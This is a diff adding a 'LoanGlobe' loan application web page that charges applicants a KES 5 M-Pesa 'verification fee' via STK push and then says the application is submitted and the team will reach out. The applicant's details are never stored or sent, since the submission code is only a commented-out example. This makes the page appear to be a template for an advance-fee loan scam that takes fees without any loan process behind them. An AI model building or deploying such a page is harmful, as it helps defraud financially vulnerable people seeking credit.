@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LoanGlobe - Quick Loan Access</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #27ae60;
+            --primary-dark: #219653;
+            --dark: #2c3e50;
+            --light: #ecf0f1;
+        }
+        * { box-sizing: border-box; margin:0; padding:0; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 1rem;
+        }
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.2rem 0;
+            background: rgba(0,0,0,0.35);
+            border-radius: 12px 12px 0 0;
+            margin-bottom: 1.5rem;
+            gap: 12px;
+        }
+        header img.logo {
+            height: 48px;
+            width: auto;
+            border-radius: 50%;
+            object-fit: contain;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+        }
+        header h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: white;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.11);
+            backdrop-filter: blur(8px);
+            padding: 2rem;
+            border-radius: 16px;
+            box-shadow: 0 12px 35px rgba(0,0,0,0.4);
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 1.8rem;
+            color: #f1f1f1;
+            font-weight: 600;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            font-size: 0.95rem;
+            color: #e0e0e0;
+        }
+        input, select {
+            width: 100%;
+            padding: 0.95rem;
+            margin-bottom: 1.3rem;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: rgba(255,255,255,0.92);
+            color: #222;
+            transition: all 0.2s;
+        }
+        input:focus, select:focus {
+            outline: 2px solid var(--primary);
+            background: white;
+        }
+        button {
+            width: 100%;
+            padding: 1.1rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s;
+        }
+        button:hover:not(:disabled) {
+            background: #2ecc71;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(39,174,96,0.4);
+        }
+        button:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 1.6rem;
+            padding: 1.1rem;
+            border-radius: 10px;
+            background: rgba(0,0,0,0.45);
+            min-height: 70px;
+            line-height: 1.5;
+            font-size: 0.95rem;
+        }
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.35);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        footer {
+            text-align: center;
+            margin-top: 2.5rem;
+            font-size: 0.85rem;
+            opacity: 0.75;
+            padding-bottom: 1rem;
+        }
+
+        @media (max-width: 480px) {
+            header h1 { font-size: 1.5rem; }
+            header img.logo { height: 42px; }
+            .container { padding: 1.6rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <!-- Replace this src with your actual logo URL -->
+        <img src="images/logo.png" alt="LoanGlobe Logo" class="logo">
+        <h1>LoanGlobe</h1>
+    </header>
+
+    <div class="container">
+        <h2>Apply for Your Loan Now</h2>
+
+        <form id="loanForm">
+            <label for="name">Full Name</label>
+            <input type="text" id="name" placeholder="John Mwangi" required>
+
+            <label for="phone">M-Pesa Phone Number</label>
+            <input type="tel" id="phone" placeholder="254712345678" required pattern="254[17]\d{8}">
+
+            <label for="country">Country</label>
+            <select id="country" required>
+                <option value="" disabled selected>Select your country</option>
+                <option value="Kenya">Kenya</option>
+                <option value="Uganda">Uganda</option>
+                <option value="Tanzania">Tanzania</option>
+                <option value="Others">Other Countries</option>
+            </select>
+
+            <label for="amount">How much do you need? (KES)</label>
+            <input type="number" id="amount" placeholder="e.g. 5000" min="1000" required>
+
+            <button type="submit" id="submitBtn">Apply Now – Pay KES 5 Verification Fee</button>
+        </form>
+
+        <div id="status"></div>
+    </div>
+
+    <footer>
+        © 2025 LoanGlobe • All rights reserved
+    </footer>
+
+    <script>
+        // Change this to your actual backend URL
+        const BACKEND_URL = "https://newpayment-srpu.onrender.com";
+
+        const form = document.getElementById('loanForm');
+        const statusDiv = document.getElementById('status');
+        const submitBtn = document.getElementById('submitBtn');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const name    = document.getElementById('name').value.trim();
+            const phone   = document.getElementById('phone').value.trim();
+            const country = document.getElementById('country').value;
+            const amount  = document.getElementById('amount').value;
+
+            if (!phone.match(/^254[17]\d{8}$/)) {
+                alert("Please enter a valid phone number starting with 2547 or 2541");
+                return;
+            }
+
+            if (!name || !country || !amount) {
+                alert("Please complete all fields");
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="loader"></span> Processing...';
+            statusDiv.innerHTML = "Sending payment prompt to your phone...";
+
+            try {
+                // Initiate STK Push for KES 5
+                const payRes = await fetch(`${BACKEND_URL}/api/initiate`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        amount: 5,
+                        phone_number: phone
+                    })
+                });
+
+                const payData = await payRes.json();
+
+                if (!payRes.ok || !payData?.invoice?.invoice_id) {
+                    throw new Error(payData.error || "Could not send payment request");
+                }
+
+                const invoiceId = payData.invoice.invoice_id;
+
+                statusDiv.innerHTML = `
+                    <strong>STK Push sent to ${phone}</strong><br>
+                    Please enter your M-Pesa PIN on your phone.<br>
+                    <small>Do NOT refresh or close this page</small>
+                `;
+
+                startPolling(invoiceId, { name, phone, country, requestedAmount: amount });
+
+            } catch (err) {
+                statusDiv.style.color = "#ff6b6b";
+                statusDiv.innerHTML = `Error: ${err.message}`;
+                resetButton();
+            }
+        });
+
+        function startPolling(invoiceId, userData) {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`${BACKEND_URL}/api/status/${invoiceId}`);
+                    const data = await res.json();
+
+                    const state = data.invoice?.state || data.state || "PENDING";
+
+                    if (state === "COMPLETE" || state === "COMPLETED") {
+                        clearInterval(interval);
+
+                        statusDiv.style.color = "#2ecc71";
+                        statusDiv.innerHTML = `
+                            <strong>✅ KES 5 payment received successfully!</strong><br>
+                            Your loan application has been submitted.<br>
+                            We will contact you soon.
+                        `;
+
+                        // You can send full data here to your database / CRM
+                        // Example:
+                        // await fetch('https://your-backend.com/applications', {
+                        //     method: 'POST',
+                        //     body: JSON.stringify(userData),
+                        //     headers: { 'Content-Type': 'application/json' }
+                        // });
+
+                        setTimeout(() => {
+                            alert("Application received! Our team will reach out shortly.");
+                            // window.location.href = "thank-you.html";
+                        }, 2800);
+
+                    } else if (["FAILED", "REJECTED", "CANCELLED"].includes(state)) {
+                        clearInterval(interval);
+                        statusDiv.style.color = "#ff6b6b";
+                        statusDiv.innerHTML = "❌ Payment failed or was cancelled.";
+                        resetButton();
+                    }
+                    // else → still processing, keep polling
+
+                } catch (err) {
+                    console.error("Polling error:", err);
+                }
+            }, 3500);
+        }
+
+        function resetButton() {
+            submitBtn.disabled = false;
+            submitBtn.textContent = "Apply Now – Pay KES 5 Verification Fee";
+        }
+    </script>
+</body>
+</html>
